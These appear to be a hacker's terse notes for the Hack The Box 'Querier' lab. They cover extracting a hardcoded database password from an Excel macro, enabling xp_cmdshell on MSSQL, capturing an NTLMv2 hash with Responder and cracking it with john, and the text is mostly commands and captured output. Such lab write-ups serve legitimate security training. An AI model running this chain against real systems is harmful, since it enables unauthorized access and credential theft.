```
smbclient //querier.htb/reports

python3 olevba.py ~/htb/querier.htb/Currency\ Volume\ Report.xlsm

#found this sus string
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"

reporting : PcwTWTHRwryjc$c6

#to connect to mssqlclient
# -windows-auth connect to windows 

/opt/impacket/examples/mssqlclient.py reporting@querier.htb -db volume -windows-auth

enable_xp_cmdshell

sudo responder -I eth0 -dwv


[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:53af3039d4607fd0:2423D19E432FFDDC2E4BF3B1E45272A5:0101000000000000C0653150DE09D201C11337A1C52B6EA7000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000051E8A512CD87D5811D02139C02C80CC4814E3213A0CCBD9EC4B588C8FCC85AD70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310039002E0032003700000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::1d968811d030fdad::
[*] Skipping previously captured hash for \gX

john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 

/opt/impacket/examples/mssqlclient.py  mssql-svc@querier.htb -db volume -windows-auth

enable_xp_cmdshell

EXEC xp_cmdshell 'whoami'


```
